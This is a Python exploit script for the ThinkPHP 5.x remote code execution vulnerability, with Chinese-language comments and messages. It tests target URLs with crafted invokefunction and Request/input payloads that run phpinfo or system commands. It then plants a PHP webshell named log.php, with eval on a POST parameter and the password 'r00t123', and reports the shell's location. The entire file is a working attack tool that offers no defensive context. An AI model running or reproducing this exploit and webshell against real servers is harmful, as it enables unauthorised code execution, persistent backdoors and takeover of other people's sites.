# /usr/bin/env python
# -*- coding:utf-8 -*-
'''
name: ThinkPHP V5.x 远程代码执行漏洞
author: melvyn
description: 远程代码执行 影响范围：5.x < 5.1.31,<= 5.0.23
'''

import sys
import requests

payload = {r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
           r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
           r"?s=index/\think\Request/input&filter=phpinfo&data=1",
           r"?s=index/\think\Request/input&filter=system&data=echo melvyn",
           r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
           r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo melvyn"}

shell_payload = [r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<^?php%20eval($_POST['r00t123']);?^>^success%20>>log.php",
                 r"?s=index/\think\template\driver\file/write&cacheFile=log.php&content=%3C?php%20eval($_POST['r00t123']);?%3Esuccess"]

def getshell(url,check_path):
    try:
        for  sp in shell_payload:
            shell_poc = check_path + sp
            response = requests.get(url=shell_poc)
            res = response.text
            res = res.encode('gbk','ignore')
            res= res.decode('gbk')
            if "public" in check_path:
                shell_path = url +"/public/" + "log.php"
            else:
                shell_path = url +"/"+"log.php"
            #print shell_path
            response1 = requests.get(url=shell_path)
            if response1.status_code  == 200 and "success" in response1.text:
                print u"[+]存在ThinkPHP V5.x 远程代码执行漏洞...\tWebshell: %s | Pass: r00t123"%shell_path
        shell_poc = check_path +r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['r00t123']);&r00t123=phpinfo();"
        #print shell_poc
        response = requests.get(url=shell_poc)
        res = response.text
        res = res.encode('gbk','ignore')
        res= res.decode('gbk')
        if 'PHP Version' in res:
            shell_path = url +"?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_POST['r00t123']);"
            print u"[+]存在ThinkPHP V5.x 远程代码执行漏洞...\tWebshell: %s | Pass: r00t123"%shell_path
        else:
            print u"[+]存在ThinkPHP V5.x 远程代码执行漏洞...\tWebshell: %s"%"unknown"                     
    except:
        print u"[+]存在ThinkPHP V5.x 远程代码执行漏洞...\tWebshell:%s"%"unknown"

def getPath(url):
    try:
        path = ["/","/public/index.php"]
        for p in path:
            for pl in payload:
                check_path = url + p
                #print check_path
                check_poc = check_path + pl
                response = requests.get(url=check_poc)
                if response.status_code == 200 or response.status_code == 500:
                    res = response.text
                    res = res.encode('gbk','ignore')
                    res= res.decode('gbk')
                    if 'PHP Version' in res or "melvyn" in res:
                        return check_path
                    else:
                        pass
                else:
                    print u"[-]不存在ThinkPHP V5.x 远程代码执行漏洞..."
    except:
        print u"[-]不存在ThinkPHP V5.x 远程代码执行漏洞..."

def exp_check(url):
    url = url.rstrip("/")
    check_path = getPath(url)
    if check_path:
        getshell(url,check_path)

if __name__ =='__main__':
    exp_check(sys.argv[1])
